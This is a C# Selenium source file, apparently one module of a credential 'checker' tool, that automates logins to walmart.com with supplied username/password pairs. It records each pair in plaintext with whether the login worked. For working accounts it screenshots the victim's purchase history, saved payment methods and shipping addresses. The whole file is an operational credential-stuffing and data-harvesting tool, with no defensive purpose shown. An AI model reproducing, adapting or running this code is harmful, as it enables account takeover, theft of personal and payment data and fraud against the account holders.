using AppData.Model;
using OpenQA.Selenium;
using System;
using System.IO;
using System.Threading;
using System.Windows;
using MessageBox = System.Windows.MessageBox;

namespace AppData.Checkers
{
    public class Wallmart
    {
        public void Check(string login, string password, IWebDriver browser)
        {
            var store = new Store();
            var user = new User(login, password);
            var fs = new FileStream(store.LogFileName("Walmart"), FileMode.Append, FileAccess.Write);
            var sw = new StreamWriter(fs);
            try
            {
                browser.Navigate().GoToUrl("https://www.walmart.com");
                browser.Navigate().GoToUrl("https://www.walmart.com/account/login");
                browser.FindElement(By.Name("email")).Click();
                browser.FindElement(By.Name("email")).Clear();
                browser.FindElement(By.Name("email")).SendKeys(user.Login);
                browser.FindElement(By.Name("password")).Click();
                browser.FindElement(By.Name("password")).Clear();
                browser.FindElement(By.Name("password")).SendKeys(user.Password);
                browser.FindElement(By.XPath("//div[4]/div/div/label")).Click();
                browser.FindElement(By.XPath("//button[@type='submit']")).Click();
                Thread.Sleep(1000);
                switch (browser.Url)
                {
                    case "https://www.walmart.com/account/login":
                        sw.WriteLine(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "|" + login +
                            "|" + password + "|false");
                        break;
                    case "https://www.walmart.com/account/forgotpassword":
                        sw.WriteLine(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "|" + login +
                            "|" + password + "|forgot password");
                        break;
                    default:
                        browser.FindElement(By.LinkText("Purchase History")).Click();
                        browser.FindElement(By.CssSelector(
                                "div.flyout.flyout-bottom.flyout-align-null.flyout-animate.flyout-fluid.flyout-button.xs-margin-ends > button.dropdown.btn.dropdown"))
                            .Click();
                        browser.FindElement(By.XPath("(//button[@type='button'])[42]")).Click();
                        Thread.Sleep(500);
                        sw.WriteLine(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "|" + login + "|" + password +
                                     "|true");
                        ((ITakesScreenshot)browser).GetScreenshot().SaveAsFile(
                            store.ScreenShotFileName("Walmart_history", login),
                            System.Drawing.Imaging.ImageFormat.Jpeg);
                        browser.FindElement(By.LinkText("Payment Methods")).Click();
                        Thread.Sleep(500);
                        ((ITakesScreenshot)browser).GetScreenshot().SaveAsFile(
                            store.ScreenShotFileName("Walmart_Payment", login),
                            System.Drawing.Imaging.ImageFormat.Jpeg);
                        browser.FindElement(By.LinkText("Your Account")).Click();
                        browser.FindElement(By.LinkText("Shipping Addresses")).Click();
                        Thread.Sleep(500);
                        ((ITakesScreenshot)browser).GetScreenshot().SaveAsFile(
                            store.ScreenShotFileName("Walmart_Address", login),
                            System.Drawing.Imaging.ImageFormat.Jpeg);
                        browser.Navigate().GoToUrl("https://www.walmart.com/account/logout");
                        break;
                }
                sw.Close();
                fs.Close();
            }
            catch (InvalidOperationException)
            {
                Store.ResultMessage("many");
                browser.Quit();
                Environment.Exit(0);
            }
            catch (NoSuchElementException e)
            {
                var result = MessageBox.Show("Something wrong: " + "\r\n" + e.Message,
                    "Error",
                    MessageBoxButton.OKCancel,
                    MessageBoxImage.Error,
                    MessageBoxResult.OK,
                    MessageBoxOptions.ServiceNotification);

                switch (result)
                {
                    case MessageBoxResult.OK:
                        sw.Close();
                        fs.Close();
                        Check(login, password, browser);
                        break;
                    case MessageBoxResult.Cancel:
                        sw.WriteLine(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "|" + login +
                                     "|" + password + "|exception|" + e.Message);
                        break;
                }
            }
            catch (WebDriverException)
            {
                Store.ResultMessage("many");
                browser.Quit();
                Environment.Exit(0);
            }
            finally
            {
                sw.Close();
                fs.Close();
            }
        }
    }
}
